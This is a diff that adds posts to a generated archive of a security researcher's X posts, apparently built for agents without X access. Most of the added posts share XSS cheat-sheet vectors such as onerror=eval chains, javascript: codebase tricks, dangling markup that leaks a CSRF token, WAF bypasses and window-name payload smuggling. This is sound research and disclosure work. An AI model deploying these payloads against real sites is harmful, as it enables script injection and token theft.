@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 89
-- Conversations/threads: 77
-- Oldest post captured: 2025-07-24
+- Posts in this file: 104
+- Conversations/threads: 92
+- Oldest post captured: 2025-05-20
 - Newest post captured: 2026-11-09
 
 
@@ -1489,3 +1489,321 @@ Tags (automatic): XSS, CSP / CSPT
 
 **Media:**
 - photo: https://pbs.twimg.com/media/GwoNGt4WgAAu__S.jpg — alt text: "<input style=x type="hidden" onsecuritypolicyviolation="alert(1)">"
+
+
+---
+
+## 2025-07-18 · Post · You can use big int after any number including octals, hex and binary. Oh JS I love your quirky natu
+
+
+### Post — @garethheyes — 2025-07-18 11:49 UTC (2025-07-18 12:49 WAT)
+
+- URL: https://x.com/garethheyes/status/1946175565045625299
+- Metrics (at fetch): bookmark 43, impression 5856, like 69, quote 1, reply 0, retweet 15
+
+> You can use big int after any number including octals, hex and binary. Oh JS I love your quirky nature ❤️. Might help bypass a flawed WAF regex. https://t.co/rsFk592XuO
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GwIzWWfW8A04ctl.jpg — alt text: "<script>
+throw-0o1337n,x=onerror=alert,1
+</script>"
+
+
+---
+
+## 2025-06-12 · Post · Mikhail Khramenkov just contributed a new dangling markup vector on the latest Chrome. Live now on o
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-06-12 13:11 UTC (2025-06-12 14:11 WAT)
+
+- URL: https://x.com/garethheyes/status/1933150207241265361
+- Metrics (at fetch): bookmark 45, impression 10559, like 94, quote 0, reply 1, retweet 16
+
+> Mikhail Khramenkov just contributed a new dangling markup vector on the latest Chrome. Live now on our XSS cheat sheet.
+>
+> Link to vector👇 https://t.co/197aYwqZl1
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GtPtNz1X0AA9cmF.jpg — alt text: "<video poster="//psres.net?
+<input name='csrf' value='1337'>...
+"
+
+
+---
+
+## 2025-06-09 · Post · Epic Firefox XSS vectors by @kinugawamasato. Now available on our XSS cheat sheet including variants
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-06-09 13:25 UTC (2025-06-09 14:25 WAT)
+
+- URL: https://x.com/garethheyes/status/1932066642026012716
+- Metrics (at fetch): bookmark 47, impression 7404, like 93, quote 0, reply 2, retweet 18
+
+> Epic Firefox XSS vectors by @kinugawamasato. Now available on our XSS cheat sheet including variants found by me.
+>
+> Link to vectors👇 https://t.co/soWiBU4SMT
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GtARDOmXgAAYhkL.jpg — alt text: "<object data=# codebase=javascript:alert(document.domain)//>
+<embed src=# codebase=javascript:alert(document.domain)//>
+<object data="#
+alert(1)" codebase=javascript://>
+<embed src="#!
+alert(1)" codebase=javascript:>"
+
+
+---
+
+## 2025-06-04 · Post · Abuse EvalError, onpageswap, and setTimeout to get JS execution without parens.
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-06-04 13:24 UTC (2025-06-04 14:24 WAT)
+
+- URL: https://x.com/garethheyes/status/1930254407171473514
+- Metrics (at fetch): bookmark 10, impression 2304, like 32, quote 0, reply 1, retweet 5
+
+> Abuse EvalError, onpageswap, and setTimeout to get JS execution without parens.
+> @_0x999 redirects the page to trigger onpageswap, hijacks the thrown error, and turns it into code. Inspired by @terjanq. Now available on the XSS cheat sheet. https://t.co/9JPGxAVeb0
+
+**Media:**
+- photo: https://pbs.twimg.com/media/Gsmi7mIWwAAGND4.jpg — alt text: "<script>
+onpageswap=setTimeout;
+location='x';
+Event.prototype.toString=EvalError.prototype.toString;
+Event.prototype.name='alert\x281\x29'
+</script>
+"
+
+
+---
+
+## 2025-06-03 · Post · Wow the XSS cheat sheet is alive and kicking! So many quality submissions
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-06-03 13:11 UTC (2025-06-03 14:11 WAT)
+
+- URL: https://x.com/garethheyes/status/1929888597018063052
+- Metrics (at fetch): bookmark 3, impression 2385, like 30, quote 0, reply 0, retweet 0
+
+> Wow the XSS cheat sheet is alive and kicking! So many quality submissions
+
+
+---
+
+## 2025-06-03 · Post · This vector adds an onerror handler with eval, rewrites all ReferenceError names, then triggers an e
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-06-03 13:06 UTC (2025-06-03 14:06 WAT)
+
+- URL: https://x.com/garethheyes/status/1929887504301248837
+- Metrics (at fetch): bookmark 42, impression 6121, like 80, quote 0, reply 1, retweet 11
+
+> This vector adds an onerror handler with eval, rewrites all ReferenceError names, then triggers an error to execute the payload. Just added it to the XSS cheat sheet. Credit to @_0x999, inspired by @terjanq.
+>
+> Link to vector👇 https://t.co/BrKqrRbCvT
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GshU617WkAA9NV0.jpg — alt text: "<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>
+"
+
+
+---
+
+## 2025-05-30 · Post · Today I fixed a really annoying web Hackvertor bug when you are creating/editing a new tag. If you c
+
+
+### Post — @garethheyes — 2025-05-30 19:11 UTC (2025-05-30 20:11 WAT)
+
+- URL: https://x.com/garethheyes/status/1928529733563699513
+- Metrics (at fetch): bookmark 0, impression 1562, like 6, quote 0, reply 0, retweet 0
+
+> Today I fixed a really annoying web Hackvertor bug when you are creating/editing a new tag. If you change the tag name the class name should now be correctly in sync with both the tag name and code inputs. I also updated the history component to show a preview of the input.
+
+
+---
+
+## 2025-05-30 · Post · I wrote up the Safari TypeError XSS I found on my lunch. It was really fun to find. 
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-05-30 17:40 UTC (2025-05-30 18:40 WAT)
+
+- URL: https://x.com/garethheyes/status/1928506798119498217
+- Metrics (at fetch): bookmark 24, impression 4776, like 58, quote 0, reply 1, retweet 10
+
+> I wrote up the Safari TypeError XSS I found on my lunch. It was really fun to find. 
+>
+> https://t.co/sIFvUCAO6F
+
+
+---
+
+## 2025-05-29 · Post · That's actually pretty nice if you want to lazily bypass a WAF 👍 https://t.co/8R4bb2oDeV
+
+
+### Post — @garethheyes — 2025-05-29 18:03 UTC (2025-05-29 19:03 WAT)
+
+- URL: https://x.com/garethheyes/status/1928150109134418086
+- Metrics (at fetch): bookmark 68, impression 8192, like 119, quote 0, reply 2, retweet 4
+
+> That's actually pretty nice if you want to lazily bypass a WAF 👍 https://t.co/8R4bb2oDeV
+
+**Quoted post (full text):**
+
+    #### Quoted post — @802058959 — 2025-05-29 16:23 UTC (2025-05-29 17:23 WAT)
+    
+    - URL: https://x.com/802058959/status/1928125078102745482
+    - Metrics (at fetch): bookmark 795, impression 52807, like 883, quote 3, reply 15, retweet 139
+    
+    > been using this techniques to bypass many WAFs, open the console in the vulnrable page, run this code to extract variables refering to window object:
+    >
+    > for(let x in window)if(window[x]===window)console.log(x);
+    >
+    > then leaverage it to execute JS functions, happy hunting :] https://t.co/QtJUTWX95z
+    
+    **Media:**
+    - media `3_1928125027435597824` (details not returned by the API)
+    
+
+
+---
+
+## 2025-05-29 · Post · Crafty JavaScript-context XSS vector using ondevicemotion, setTimeout, and URIError spoofing to trig
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-05-29 13:49 UTC (2025-05-29 14:49 WAT)
+
+- URL: https://x.com/garethheyes/status/1928086338043056219
+- Metrics (at fetch): bookmark 38, impression 6800, like 87, quote 0, reply 3, retweet 14
+
+> Crafty JavaScript-context XSS vector using ondevicemotion, setTimeout, and URIError spoofing to trigger alert(1) now added to the XSS cheat sheet. By @_0x999 inspired by @terjanq.
+>
+> Link to vector👇 https://t.co/OKsEkF9SN1
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GsHooiUXIAAydeI.jpg — alt text: "ondevicemotion=setTimeout;
+Event.prototype.toString=URIError.prototype.toString;
+Event.prototype.message='alert\x281\x29'"
+
+
+---
+
+## 2025-05-28 · Post · My new favourite XSS vector only on beloved Safari. Can you work it out without looking at the link?
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-05-28 11:37 UTC (2025-05-28 12:37 WAT)
+
+- URL: https://x.com/garethheyes/status/1927690578134798359
+- Metrics (at fetch): bookmark 37, impression 8688, like 89, quote 1, reply 1, retweet 5
+
+> My new favourite XSS vector only on beloved Safari. Can you work it out without looking at the link?
+>
+> https://t.co/OdaeDqkPlM https://t.co/c8hwUxpwGy
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GsCHSJkWMAEuP8k.jpg — alt text: "<script>onerror = eval,new name</script>"
+
+
+---
+
+## 2025-05-27 · Post · The changes I made to web Hackvertor made it much easier to test XSS vectors for the cheat sheet. It
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-05-27 17:33 UTC (2025-05-27 18:33 WAT)
+
+- URL: https://x.com/garethheyes/status/1927417861691105355
+- Metrics (at fetch): bookmark 1, impression 1626, like 11, quote 0, reply 0, retweet 0
+
+> The changes I made to web Hackvertor made it much easier to test XSS vectors for the cheat sheet. It's great using your own tools because you instantly see the problems.
+
+
+---
+
+## 2025-05-27 · Post · Firefox now opens the door to URL-based XSS payload smuggling too. Yep, even more ways to sneak past
+
+
+Tags (automatic): XSS, Request smuggling / desync
+
+
+### Post — @garethheyes — 2025-05-27 13:54 UTC (2025-05-27 14:54 WAT)
+
+- URL: https://x.com/garethheyes/status/1927362878610255966
+- Metrics (at fetch): bookmark 48, impression 8279, like 89, quote 0, reply 2, retweet 16
+
+> Firefox now opens the door to URL-based XSS payload smuggling too. Yep, even more ways to sneak past filters using the window name and clever URL tricks. Link to vectors👇 https://t.co/W3m7IF6JNS
+
+**Media:**
+- photo: https://pbs.twimg.com/media/Gr9G7oUXQAAosuR.jpg — alt text: "<script>throw onerror=eval,{
+   lineNumber:1,columnNumber:1,fileName:1,message:name
+}</script>
+<svg onload="throw top.onerror=eval,{
+   lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL
+}">"
+- photo: https://pbs.twimg.com/media/Gr9MvJdWAAE1UxO.jpg — alt text: "<body onload="throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}">
+<script>throw lineNumber=columnNumber=fileName=message=name,onerror=eval,{lineNumber,columnNumber,fileName,message}</script>
+"
+
+
+---
+
+## 2025-05-22 · Post · URL-based XSS payload smuggling yup, it’s a thing. You can sneak payloads past filters in unexpected
+
+
+Tags (automatic): XSS, Request smuggling / desync
+
+
+### Post — @garethheyes — 2025-05-22 13:59 UTC (2025-05-22 14:59 WAT)
+
+- URL: https://x.com/garethheyes/status/1925552139918528667
+- Metrics (at fetch): bookmark 67, impression 8330, like 116, quote 0, reply 2, retweet 16
+
+> URL-based XSS payload smuggling yup, it’s a thing. You can sneak payloads past filters in unexpected ways using the window name and creative URL abuse. Shoutout to @williamserizao for the idea.
+> Link to vectors👇 https://t.co/voPFKt1Q1j
+
+**Media:**
+- photo: https://pbs.twimg.com/media/GrjefbqXAAA9CRu.jpg — alt text: "<script>throw onerror=eval,name</script>
+<script>throw onerror=eval,'/*'+location</script>
+<svg onload="throw top.onerror=eval,'/*'+URL">
+<body onload="throw onerror=eval,'/*'+location">"
+
+
+---
+
+## 2025-05-20 · Post · Fixed the parser bug in Hackvertor that was actually fun. Then hacked HackPad. 1. User visits malici
+
+
+Tags (automatic): XSS
+
+
+### Post — @garethheyes — 2025-05-20 21:06 UTC (2025-05-20 22:06 WAT)
+
+- URL: https://x.com/garethheyes/status/1924934767495065712
+- Metrics (at fetch): bookmark 1, impression 1360, like 8, quote 0, reply 1, retweet 0
+
+> Fixed the parser bug in Hackvertor that was actually fun. Then hacked HackPad. 1. User visits malicious site. 2. Clicks link to open window to HackPad. 3. User switches off sandbox. 4. Malicious site changes win location hash. 5. User clicks execute. 6. XSS
